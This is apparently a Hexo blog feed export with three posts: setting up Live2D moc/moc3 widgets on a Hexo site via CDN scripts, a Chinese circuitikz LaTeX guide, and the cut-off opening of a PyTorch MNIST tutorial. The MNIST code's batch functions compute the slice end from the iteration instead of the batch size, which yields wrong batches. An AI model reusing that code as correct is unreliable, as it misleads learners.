<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install --save live2d-widget-model-shizuku</span></span><br></pre></td></tr></table></figure>
<p>看下文件结构：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── assets</span><br><span class="line">│   ├── exp</span><br><span class="line">│   │   ├── f01.exp.json</span><br><span class="line">│   │   ├── f02.exp.json</span><br><span class="line">│   │   ├── f03.exp.json</span><br><span class="line">│   │   └── f04.exp.json</span><br><span class="line">│   ├── moc</span><br><span class="line">│   │   ├── shizuku.1024</span><br><span class="line">│   │   │   ├── texture_00.png</span><br><span class="line">│   │   │   ├── texture_01.png</span><br><span class="line">│   │   │   ├── texture_02.png</span><br><span class="line">│   │   │   ├── texture_03.png</span><br><span class="line">│   │   │   ├── texture_04.png</span><br><span class="line">│   │   │   └── texture_05.png</span><br><span class="line">│   │   └── shizuku.moc</span><br><span class="line">│   ├── mtn</span><br><span class="line">│   │   ├── flickHead_00.mtn</span><br><span class="line">│   │   ├── flickHead_01.mtn</span><br><span class="line">│   │   ├── flickHead_02.mtn</span><br><span class="line">│   │   ├── idle_00.mtn</span><br><span class="line">│   │   ├── idle_01.mtn</span><br><span class="line">│   │   ├── idle_02.mtn</span><br><span class="line">│   │   ├── pinchIn_00.mtn</span><br><span class="line">│   │   ├── pinchIn_01.mtn</span><br><span class="line">│   │   ├── pinchIn_02.mtn</span><br><span class="line">│   │   ├── pinchOut_00.mtn</span><br><span class="line">│   │   ├── pinchOut_01.mtn</span><br><span class="line">│   │   ├── pinchOut_02.mtn</span><br><span class="line">│   │   ├── shake_00.mtn</span><br><span class="line">│   │   ├── shake_01.mtn</span><br><span class="line">│   │   ├── shake_02.mtn</span><br><span class="line">│   │   ├── tapBody_00.mtn</span><br><span class="line">│   │   ├── tapBody_01.mtn</span><br><span class="line">│   │   └── tapBody_02.mtn</span><br><span class="line">│   ├── shizuku.model.json</span><br><span class="line">│   ├── shizuku.physics.json</span><br><span class="line">│   ├── shizuku.pose.json</span><br><span class="line">│   └── snd</span><br><span class="line">│       ├── flickHead_00.mp3</span><br><span class="line">│       ├── flickHead_01.mp3</span><br><span class="line">│       ├── flickHead_02.mp3</span><br><span class="line">│       ├── pinchIn_00.mp3</span><br><span class="line">│       ├── pinchIn_01.mp3</span><br><span class="line">│       ├── pinchIn_02.mp3</span><br><span class="line">│       ├── pinchOut_00.mp3</span><br><span class="line">│       ├── pinchOut_01.mp3</span><br><span class="line">│       ├── pinchOut_02.mp3</span><br><span class="line">│       ├── shake_00.mp3</span><br><span class="line">│       ├── shake_01.mp3</span><br><span class="line">│       ├── shake_02.mp3</span><br><span class="line">│       ├── tapBody_00.mp3</span><br><span class="line">│       ├── tapBody_01.mp3</span><br><span class="line">│       └── tapBody_02.mp3</span><br><span class="line">└── package.json</span><br><span class="line"></span><br><span class="line">6 directories, 48 files</span><br></pre></td></tr></table></figure>
<p>如果我们有一个moc模型的话，就可以考虑模仿这样的文件格式安排，伪装成能被插件正常执行的模型包，在hexo里面跑起来。</p>
<p>最后我把原来的模型包修改成了这样：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/Hexo-Live2d-moc3-Configuration/theresa.png">
<p>这里有一点需要注意：<strong><code>.model3.json</code>文件内含relative file reference，在调整文件结构的时候也需要把里面的内容也做改动。</strong></p>
<p>最终效果是这样的：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/Hexo-Live2d-moc3-Configuration/result1.png">
<h2 id="moc3模型"><a href="#moc3模型" class="headerlink" title="moc3模型"></a>moc3模型</h2><p>不过这几年来新的模型大多以moc3的格式来传播，用原来moc格式的办法没法直接套用，尝试另外的解决方案。</p>
<p>moc3模型以嘉然为例（<del>然然你带我走吧然然</del></p>
<p>第一种尝试是从这几个repo来看看能不能伪装格式一起套用：</p>
<ul>
<li><a href="https://github.com/Yukariin/AzurLaneL2DViewer">https://github.com/Yukariin/AzurLaneL2DViewer</a></li>
<li><a href="https://github.com/alg-wiki/AzurLaneL2DViewer">https://github.com/alg-wiki/AzurLaneL2DViewer</a></li>
<li><a href="https://github.com/HCLonely/Live2dV3">https://github.com/HCLonely/Live2dV3</a></li>
<li><a href="https://github.com/LitStronger/live2d-moc3">https://github.com/LitStronger/live2d-moc3</a></li>
</ul>
<p>然后发现不行，遂放弃。</p>
<p>第二种尝试来自这篇博客：<a href="https://www.cnblogs.com/Arisf/p/14347362.html">https://www.cnblogs.com/Arisf/p/14347362.html</a></p>
<p>首先是需要live2d cubism有关的几个js：</p>
<ul>
<li><code>bundle.js</code>，似乎需要自己生成</li>
<li><code>live2dcubismcore.js</code>，是官方web sdk的</li>
</ul>
<p>相应所需要的js文件跟模型都一起放在了<a href="https://github.com/Garen-Wang/live2d-moc3">我github的repo</a>里面，感谢开源，侵删。</p>
<p>可以首先在本地上试试能不能跑起来。事实上把这几行代码一起粘到<code>body</code>标签里面就好了：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;live2d&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span> <span class="attr">class</span>=<span class="string">&quot;live2d&quot;</span> <span class="attr">style</span>=<span class="string">&quot;position: fixed; opacity: 1; left: -110px; bottom: -135px; z-index: 99999; pointer-events: none;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.1.1/js/live2dcubismcore.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@vv0.1.1/js/bundle.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">     <span class="keyword">var</span> resourcesPath = <span class="string">&#x27;https://cdn.jsdelivr.net/gh/Garen-Wang/live2d-moc3@v0.1.0/&#x27;</span>; <span class="comment">// 指定资源文件（模型）保存的路径，使用github的release版本，路径如下https://cdn.jsdelivr.net/gh/用户/库@版本号/资源路径</span></span></span><br><span class="line"><span class="javascript">     <span class="keyword">var</span> backImageName = <span class="string">&#x27;&#x27;</span>; <span class="comment">// 指定背景图片 ,默认为空</span></span></span><br><span class="line"><span class="javascript">     <span class="keyword">var</span> modelDir = [<span class="string">&#x27;jiaran4&#x27;</span>]; <span class="comment">// 指定需要加载的模型</span></span></span><br><span class="line"><span class="javascript">     initDefine(resourcesPath, backImageName, modelDir); <span class="comment">// 初始化模型</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其中不知道是cdn抽风还是什么奇怪的原因，原本应该是<code>v0.1.1</code>的地方需要是<code>vv0.1.1</code>才访问得到，非常奇怪。</p>
<p>如果正常的话应该是这样子：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/Hexo-Live2d-moc3-Configuration/demo.png">
<p>接下来把然然带进hexo博客里面。由于我用的NexT主题，修改<code>themes/next/layout/_layout.swig</code>，直接在<code>body</code>标签的最后边粘上去这几行，做法非常暴力。</p>
<p>不出意外的话然然应该就能跟爷同框了，像下面这样（</p>
<img data-src="http://qiniu.garen-wang.top/static/images/Hexo-Live2d-moc3-Configuration/result2.png">]]></content>
  </entry>
  <entry>
    <title>LaTeX circuitikz简易食用指南</title>
    <url>/2021/10/07/LaTeX-circuitikz%E7%AE%80%E6%98%93%E9%A3%9F%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h2 id="写前的扯淡"><a href="#写前的扯淡" class="headerlink" title="写前的扯淡"></a>写前的扯淡</h2><p>今天下午在做电路作业，画电路把自己画累了，不想拿格子一笔一笔画电路，于是看看能不能用LaTeX来写。</p>
<p><del>就没听说过由于懒得手写作业而来用TeX画电路的，属实离谱</del></p>
<p>circuitikz是tikz的超集，是在tikz的基础上添加了专属画电路的语法内容。</p>
<h2 id="import"><a href="#import" class="headerlink" title="import"></a>import</h2><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\usepackage</span>&#123;circuitikz&#125;</span><br></pre></td></tr></table></figure>
<p>不需要<code>\usepackage&#123;tikz&#125;</code>。</p>
<a id="more"></a>
<h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h2><blockquote>
<p>摘自<a href="https://www.overleaf.com/learn/latex/LaTeX_Graphics_using_TikZ%3A_A_Tutorial_for_Beginners_(Part_4">overleaf的tutorial</a>%E2%80%94Circuit_Diagrams_Using_Circuitikz)</p>
</blockquote>
<p>我们直接拿一段hello world难度的代码来分析下，看看你要写的内容表示了啥：</p>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;circuitikz&#125;</span><br><span class="line"><span class="keyword">\draw</span> (0,0) to[battery] (0,4)</span><br><span class="line">  to[ammeter] (4,4) </span><br><span class="line">  to[C] (4,0) -- (3.5,0)</span><br><span class="line">  to[lamp, *-*] (0.5,0) -- (0,0)</span><br><span class="line">(0.5,0) -- (0.5,-2)</span><br><span class="line">  to[voltmeter] (3.5,-2) -- (3.5,0)</span><br><span class="line">;</span><br><span class="line"><span class="keyword">\end</span>&#123;circuitikz&#125;</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.top/static/images/./LaTeX-circuitikz简易食用指南/hello_world.png">
<h2 id="对hello-world的分析"><a href="#对hello-world的分析" class="headerlink" title="对hello world的分析"></a>对hello world的分析</h2><p>代码的最外层框架是这个样子：</p>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;circuitikz&#125;</span><br><span class="line"><span class="keyword">\draw</span> (0, 0)</span><br><span class="line">&lt;your-code&gt;</span><br><span class="line">;</span><br><span class="line"><span class="keyword">\end</span>&#123;circuitikz&#125;</span><br></pre></td></tr></table></figure>
<p>这里其实可以像tikz那样在里面写多个<code>\draw</code>语句，如果有很多并联电路可以自己用到。</p>
<p>每条具体的语句中有几个重点的地方：</p>
<ul>
<li><code>to</code>后面中括号可以填内容，第一个表示了元件的种类，后面的是可选参数，关于可选参数后面再分析。</li>
<li>中括号后可以紧跟一个坐标，这代表着从<strong>当前的起点</strong>到该坐标居中绘出上面指定的电路元件。</li>
<li>两个坐标可以直接用<code>--</code>来连接，这代表着用直的导线来连接这两个点。</li>
<li>在我自己认为，一个<code>\draw</code>语句最好是描述一个网孔的电路元件分布情况，如果有并联的，虽然也可以在同一个<code>\draw</code>语句中完成，不过我倾向于另起几个<code>\draw</code>来完成。</li>
</ul>
<h2 id="基本电路元件"><a href="#基本电路元件" class="headerlink" title="基本电路元件"></a>基本电路元件</h2><p>这部分是填在中括号的第一个参数中的：</p>
<ul>
<li>current source: I</li>
<li>voltage source: V</li>
<li>capacitance: C</li>
<li>voltmeter: voltmeter</li>
<li>ammeter: ammeter</li>
<li>lamp: lamp</li>
<li>resistor: R</li>
<li>battery: battery</li>
<li>wire: short</li>
</ul>
<p>电路元件自然有不同的样式风格，就比如电阻可以是一个矩形也可以是折线，一般我们通过选用american或者european来确定电路的样式。</p>
<h2 id="可选参数"><a href="#可选参数" class="headerlink" title="可选参数"></a>可选参数</h2><h3 id="标节点"><a href="#标节点" class="headerlink" title="标节点"></a>标节点</h3><ul>
<li><code>o-o</code>：在连线的起始段和末端都画一个空心点</li>
<li><code>*-*</code>：在连线的起始段和末端都画一个实心点</li>
<li><code>o-*</code></li>
<li><code>*-o</code></li>
</ul>
<h3 id="加样式"><a href="#加样式" class="headerlink" title="加样式"></a>加样式</h3><ul>
<li><code>l=</code></li>
<li><code>i=</code></li>
<li><code>v=</code>：一个弧线的箭头</li>
<li><code>f=</code>：一个浮在旁边的箭头，经常用来标电流，及其常用</li>
<li><code>f_=</code>：数据或者标识符通过加一个下划线可以换一边</li>
</ul>
<h3 id="加单位"><a href="#加单位" class="headerlink" title="加单位"></a>加单位</h3><ul>
<li><code>&lt;\ampere&gt;</code></li>
<li><code>&lt;\volt&gt;</code></li>
<li><code>&lt;\frad&gt;</code></li>
<li><code>&lt;\ohm&gt;</code></li>
<li><code>&lt;\kilo&gt;</code>, <code>&lt;\milli&gt;</code>, …</li>
<li>当然，传统套行内公式的方法也是可以的</li>
</ul>
<h3 id="加颜色"><a href="#加颜色" class="headerlink" title="加颜色"></a>加颜色</h3><ul>
<li><code>color=red</code></li>
</ul>
<h3 id="调大小"><a href="#调大小" class="headerlink" title="调大小"></a>调大小</h3><p>一般其实是不用调的，挤的话直接调大一点就好了，不过想调元件大小也不是不可以啦（</p>
<ul>
<li><code>\ctikzset&#123;bipoles/resistor/height=0.15&#125;</code>：斜杠分隔出若干个想调大小参数的元件名称，这一行调高</li>
<li><code>\ctikzset&#123;bipoles/resistor/width=0.4&#125;</code>：也可以调宽</li>
</ul>
<h3 id="特殊的"><a href="#特殊的" class="headerlink" title="特殊的"></a>特殊的</h3><ul>
<li><code>V&lt;=10V</code>：如果想要画的电压源的方向跟默认相反，就手动调整</li>
<li><code>f&gt;^=i</code>：在流入方向加一个箭头，标志为i</li>
</ul>
<h2 id="examples"><a href="#examples" class="headerlink" title="examples"></a>examples</h2><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;circuitikz&#125;[european]</span><br><span class="line">    <span class="keyword">\draw</span> (0, 0)</span><br><span class="line">    to [R=<span class="built_in">$</span>R<span class="built_in">_</span>2<span class="built_in">$</span>] (0, 2) -- (0, 6)</span><br><span class="line">    to [I=<span class="built_in">$</span>i<span class="built_in">_</span>&#123;s1&#125;<span class="built_in">$</span>] (6, 6) -- (6, 2)</span><br><span class="line">    to [V&lt;=<span class="built_in">$</span>v<span class="built_in">_</span>s<span class="built_in">$</span>] (6, 0)</span><br><span class="line">    to [short, f=i] (3, 0) -- (0, 0)</span><br><span class="line">    (6, 4.5)</span><br><span class="line">    to [R=<span class="built_in">$</span>R<span class="built_in">_</span>1<span class="built_in">$</span>] (0, 4.5)</span><br><span class="line">    (6, 3)</span><br><span class="line">    to [R=<span class="built_in">$</span>R<span class="built_in">_</span>3<span class="built_in">$</span>] (3, 3) -- (2, 3)</span><br><span class="line">    to [I<span class="built_in">_</span>=<span class="built_in">$</span>i<span class="built_in">_</span>&#123;s2&#125;<span class="built_in">$</span>] (0, 3)</span><br><span class="line">    (2, 3)</span><br><span class="line">    to [R=<span class="built_in">$</span>R<span class="built_in">_</span>4<span class="built_in">$</span>, f&gt;<span class="built_in">^</span>=<span class="built_in">$</span>i<span class="built_in">_</span>4<span class="built_in">$</span>] (2, 0)</span><br><span class="line">    ;</span><br><span class="line">    <span class="comment">% \draw (5, 0) to [open, i=$i$] (4, 0);</span></span><br><span class="line">    <span class="comment">% \draw (2, 3) to [open, i=$i_4$] (2, 2);</span></span><br><span class="line"><span class="keyword">\end</span>&#123;circuitikz&#125;</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.top/static/images/LaTeX-circuitikz简易食用指南/p35.png">
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;circuitikz&#125;[european]</span><br><span class="line">    <span class="keyword">\draw</span> (0, 0)</span><br><span class="line">    to [V=9V] (0, 4)</span><br><span class="line">    to [short] (4, 4)</span><br><span class="line">    to [R=2&lt;<span class="keyword">\ohm</span>&gt;] (5, 4) -- (6, 4)</span><br><span class="line">    to [V&lt;=3V] (7, 4) -- (8, 4)</span><br><span class="line">    to [R=3&lt;<span class="keyword">\ohm</span>&gt;] (9, 4) -- (10, 4)</span><br><span class="line">    to [V=4V] (11, 4) -- (12, 4)</span><br><span class="line">    to [R=6&lt;<span class="keyword">\ohm</span>&gt;, f&gt;<span class="built_in">^</span>=i] (12, 0) -- (0, 0)</span><br><span class="line">    ;</span><br><span class="line">    <span class="keyword">\draw</span> (2, 4)</span><br><span class="line">    to [R=9&lt;<span class="keyword">\ohm</span>&gt;] (2, 0);</span><br><span class="line">    <span class="keyword">\draw</span> (3, 4)</span><br><span class="line">    to [R=3&lt;<span class="keyword">\ohm</span>&gt;] (3, 2)</span><br><span class="line">    to [I&lt;=2A] (3, 0);</span><br><span class="line">    <span class="keyword">\draw</span> (7.5, 4)</span><br><span class="line">    to [R=2&lt;<span class="keyword">\ohm</span>&gt;] (7.5, 2)</span><br><span class="line">    to [V&lt;=10V] (7.5, 0);</span><br><span class="line"><span class="keyword">\end</span>&#123;circuitikz&#125;</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.top/static/images/LaTeX-circuitikz简易食用指南/p36.png">
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;circuitikz&#125;[european]</span><br><span class="line">    <span class="keyword">\draw</span> (0, 0)</span><br><span class="line">    to [R=2&lt;<span class="keyword">\ohm</span>&gt;] (0, 2) -- (0, 3)</span><br><span class="line">    to [R=1&lt;<span class="keyword">\ohm</span>&gt;] (0, 4) -- (0, 5)</span><br><span class="line">    to [short] (4, 5) -- (5, 5)</span><br><span class="line">    to [R=2&lt;<span class="keyword">\ohm</span>&gt;, f&gt;=i] (8, 5)</span><br><span class="line">    to [V&lt;=10V] (8, 0) -- (0, 0)</span><br><span class="line">    (5, 0)</span><br><span class="line">    to [R=2&lt;<span class="keyword">\ohm</span>&gt;] (5, 2) -- (5, 3)</span><br><span class="line">    to [R=4&lt;<span class="keyword">\ohm</span>&gt;] (5, 4) -- (5, 5)</span><br><span class="line">    (0, 2.3)</span><br><span class="line">    to [I=9A] (5, 2.3)</span><br><span class="line">    ;</span><br><span class="line"><span class="keyword">\end</span>&#123;circuitikz&#125;</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.top/static/images/LaTeX-circuitikz简易食用指南/p37.png">
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">\begin</span>&#123;circuitikz&#125;[european]</span><br><span class="line">    <span class="keyword">\draw</span> (0, 0)</span><br><span class="line">    to [short] (0, 6)</span><br><span class="line">    to [R=4&lt;<span class="keyword">\ohm</span>&gt;] (3, 6)</span><br><span class="line">    to [R=6&lt;<span class="keyword">\ohm</span>&gt;] (6, 6)</span><br><span class="line">    to [short] (6, 0)</span><br><span class="line">    to [V=10V] (0, 0)</span><br><span class="line">    (0, 3)</span><br><span class="line">    to [R=6&lt;<span class="keyword">\ohm</span>&gt;] (3, 3)</span><br><span class="line">    to [R=4&lt;<span class="keyword">\ohm</span>&gt;] (6, 3)</span><br><span class="line">    ;</span><br><span class="line">    <span class="keyword">\draw</span></span><br><span class="line">    (3, 6) node[label=&#123;[font=<span class="keyword">\footnotesize</span>]above:a&#125;] &#123;&#125;</span><br><span class="line">    to [R=<span class="built_in">$</span>R<span class="built_in">_</span>x<span class="built_in">$</span>, f=i, *-*] (3, 3) node[label=&#123;[font=<span class="keyword">\footnotesize</span>]below:b&#125;] &#123;&#125;</span><br><span class="line">    ;</span><br><span class="line"><span class="keyword">\end</span>&#123;circuitikz&#125;</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.top/static/images/LaTeX-circuitikz简易食用指南/p38.png">
<h2 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h2><ul>
<li>不会就google</li>
<li>不过有时去google还不如直接翻<a href="https://mirrors.sustech.edu.cn/CTAN/graphics/pgf/contrib/circuitikz/doc/circuitikzmanual.pdf">官方的manual</a></li>
<li>多手贱，多写，多写就会了</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Learn MNIST in PyTorch from Scratch to CNN</title>
    <url>/2021/01/11/Learn-MNIST-in-PyTorch-from-Scratch-to-CNN/</url>
    <content><![CDATA[<p>Today I spent nearly an afternoon to follow the tutorial on <a href="pytorch.org">pytorch.org</a>. So just recall what I have learnt here.</p>
<p>(all in PyTorch…)</p>
<h2 id="from-Scratch"><a href="#from-Scratch" class="headerlink" title="from Scratch"></a>from Scratch</h2><p>We first write our code without too many features of PyTorch so that we can gradually see what can be simplified when using PyTorch.</p>
<a id="more"></a>
<h3 id="Download-MNIST-Data"><a href="#Download-MNIST-Data" class="headerlink" title="Download MNIST Data"></a>Download MNIST Data</h3><p>data download link: <a href="https://github.com/pytorch/tutorials/raw/master/_static/mnist.pkl.gz">https://github.com/pytorch/tutorials/raw/master/_static/mnist.pkl.gz</a></p>
<p>After manually decompressing this file, we use <code>pickle</code> to read data.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_data</span>():</span></span><br><span class="line">    path = Path(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.exists():</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            (XTrain, YTrain), (XTest, YTest), _ = pickle.load(f, encoding=<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> XTrain, YTrain, XTest, YTest</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(FileNotFoundError)</span><br></pre></td></tr></table></figure>
<p>It’s worth mentioning that the second dimension of <code>XTrain</code> and <code>XTest</code> are 784, which is identical to 28 * 28.</p>
<p>Using <code>plt.imshow</code> and <code>plt.show</code> function, single data can be shown easily.</p>
<p>Here is the initial code implementing MNIST with few feature of PyTorch:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_data</span>():</span></span><br><span class="line">    path = Path(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.exists():</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data/mnist/mnist.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            (XTrain, YTrain), (XTest, YTest), _ = pickle.load(f, encoding=<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> XTrain, YTrain, XTest, YTest</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(FileNotFoundError)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw</span>(<span class="params">X</span>):</span></span><br><span class="line">    print(X.shape)</span><br><span class="line">    plt.imshow(X.reshape((<span class="number">28</span>, <span class="number">28</span>)), cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_softmax</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x - x.exp().<span class="built_in">sum</span>(-<span class="number">1</span>).log().unsqueeze(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">X</span>):</span></span><br><span class="line">    <span class="keyword">return</span> log_softmax(X @ weights + bias)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nll</span>(<span class="params">batch_z, batch_y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> -batch_z[<span class="built_in">range</span>(batch_y.shape[<span class="number">0</span>]), batch_y].mean()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">loss_func = nll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">accuracy</span>(<span class="params">batch_z, batch_y</span>):</span></span><br><span class="line">    temp = torch.argmax(batch_z, dim=<span class="number">1</span>)</span><br><span class="line">    r = (temp == batch_y)</span><br><span class="line">    <span class="keyword">return</span> r.<span class="built_in">float</span>().mean()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_batch_train_data</span>(<span class="params">batch_size, iteration</span>):</span></span><br><span class="line">    start = batch_size * iteration</span><br><span class="line">    end = start + iteration</span><br><span class="line">    <span class="keyword">return</span> XTrain[start:end], YTrain[start:end]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_batch_test_data</span>(<span class="params">batch_size, iteration</span>):</span></span><br><span class="line">    start = batch_size * iteration</span><br><span class="line">    end = start + iteration</span><br><span class="line">    <span class="keyword">return</span> XTest[start:end], YTest[start:end]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XTrain, YTrain, XTest, YTest = read_data()  <span class="comment"># train: 50000, test: 10000</span></span><br><span class="line">XTrain, YTrain, XTest, YTest = <span class="built_in">map</span>(torch.tensor, (XTrain, YTrain, XTest, YTest))</span><br><span class="line"></span><br><span class="line">weights = torch.randn(<span class="number">784</span>, <span class="number">10</span>) / math.sqrt(<span class="number">784</span>)</span><br><span class="line">weights.requires_grad_()</span><br><span class="line">bias = torch.zeros(<span class="number">10</span>, requires_grad=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span>(<span class="params">max_epoch, max_iteration, batch_size, lr</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;training...&#x27;</span>)</span><br><span class="line">    <span class="keyword">global</span> weights, bias</span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(max_epoch):</span><br><span class="line">        <span class="keyword">for</span> iteration <span class="keyword">in</span> <span class="built_in">range</span>(max_iteration):</span><br><span class="line">            start = iteration * batch_size</span><br><span class="line">            end = start + batch_size</span><br><span class="line">            batch_x, batch_y = get_batch_train_data(batch_size, iteration)</span><br><span class="line">            batch_z = forward(batch_x)</span><br><span class="line">            loss = loss_func(batch_z, batch_y)</span><br><span class="line"></span><br><span class="line">            loss.backward()</span><br><span class="line">            <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">                weights -= lr * weights.grad</span><br><span class="line">                bias -= lr * bias.grad</span><br><span class="line">                weights.grad.zero_()</span><br><span class="line">                bias.grad.zero_()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;training done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;testing...&#x27;</span>)</span><br><span class="line">    ZTest = forward(XTest)</span><br><span class="line">    print(<span class="string">&#x27;loss=%.4f, accuracy=%.4f&#x27;</span> % (loss_func(ZTest, YTest), accuracy(ZTest, YTest)))</span><br><span class="line">    print(<span class="string">&#x27;testing done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    num_train = XTrain.shape[<span class="number">0</span>]</span><br><span class="line">    num_test = XTest.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># batch_x = XTrain[:batch_size]</span></span><br><span class="line">    <span class="comment"># batch_z = forward(batch_x)</span></span><br><span class="line">    <span class="comment"># print(batch_z[0], batch_z.shape)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># batch_y = YTrain[:batch_size]</span></span><br><span class="line">    <span class="comment"># print(loss_func(batch_z, batch_y))</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># print(accuracy(batch_z, batch_y))</span></span><br><span class="line"></span><br><span class="line">    batch_size = <span class="number">64</span></span><br><span class="line">    lr = <span class="number">0.05</span></span><br><span class="line">    max_epoch = <span class="number">20</span></span><br><span class="line">    max_iteration = math.ceil(num_train / batch_size)</span><br><span class="line">    train(max_epoch, max_iteration, batch_size, lr)</span><br><span class="line">    test()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Most of the details can be answered if you have learnt about the basic knowledge of neural network, and most of the procedures are very similar to <a href="github.com/microsoft/ai-edu">the tutorial I learn</a>.</p>
<p>Now the magic just begins.</p>
